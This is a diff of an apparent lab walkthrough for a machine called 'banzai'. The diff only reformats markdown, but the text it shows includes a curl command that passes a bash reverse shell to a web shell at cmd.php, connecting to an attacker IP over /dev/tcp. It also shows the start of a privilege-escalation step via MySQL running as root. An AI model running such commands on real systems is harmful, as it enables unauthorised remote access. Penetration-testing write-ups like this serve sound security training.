@@ -55,13 +55,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 We now have RCE, and we can easily get a reverse shell.
 
-{% code overflow="wrap" %}
 ```
 $ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.45.191/21 0>&1"' http://192.168.160.56:8295/cmd.php
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (1314).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1314).png>)
 
 ## Privilege Escalation
 
@@ -89,12 +87,10 @@ tcp6       0      0 :::8080                 :::*                    LISTEN      
 
 When checking which user was running it, I found that it was the `root` user:
 
-{% code overflow="wrap" %}
 ```
 www-data@banzai:/home/banzai$ ps -elf | grep mysql
 5 S root       799     1  0  80   0 - 280746 -     00:01 ?        00:00:00 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid
 ```
-{% endcode %}
 
 Conveniently, MySQL creds were also present within the machine:
 
